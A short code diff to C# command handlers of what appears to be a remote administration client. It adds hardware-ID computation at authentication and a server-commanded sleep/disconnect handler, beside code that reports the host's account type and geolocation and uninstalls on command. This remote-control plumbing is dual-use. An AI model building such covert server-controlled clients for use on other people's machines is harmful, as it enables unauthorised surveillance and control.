@@ -16,6 +16,10 @@ namespace xClient.Core.Commands
         public static void HandleGetAuthentication(Packets.ServerPackets.GetAuthentication command, Client client)
         {
             GeoLocationHelper.Initialize();
+
+            //Compute ID value for DevicesHelper.HardwareId
+            DevicesHelper.ComputeId(client.LocalAddress.Address.ToString());
+
             new Packets.ClientPackets.GetAuthenticationResponse(Settings.VERSION, PlatformHelper.FullName, WindowsAccountHelper.GetAccountType(),
                 GeoLocationHelper.GeoInfo.Country, GeoLocationHelper.GeoInfo.CountryCode,
                 GeoLocationHelper.GeoInfo.Region, GeoLocationHelper.GeoInfo.City, GeoLocationHelper.ImageIndex,
@@ -98,6 +102,22 @@ namespace xClient.Core.Commands
             new Packets.ClientPackets.SetStatus("Uninstalling... bye ;(").Execute(client);
 
             ClientUninstaller.Uninstall(client);
+        }
+
+        public static void HandleDoSleep(Packets.ServerPackets.DoSleep command, Client client)
+        {
+            if (command.IsSleep)
+            {
+                if (Program.ConnectClient.SleepInterval != command.Interval && command.Interval > 2500)
+                {
+                    Program.ConnectClient.SleepInterval = command.Interval;
+                }
+                Program.ConnectClient.Disconnect();
+            }
+            else
+            {
+                Program.ConnectClient.SleepInterval = 0;
+            }
         }
     }
 }
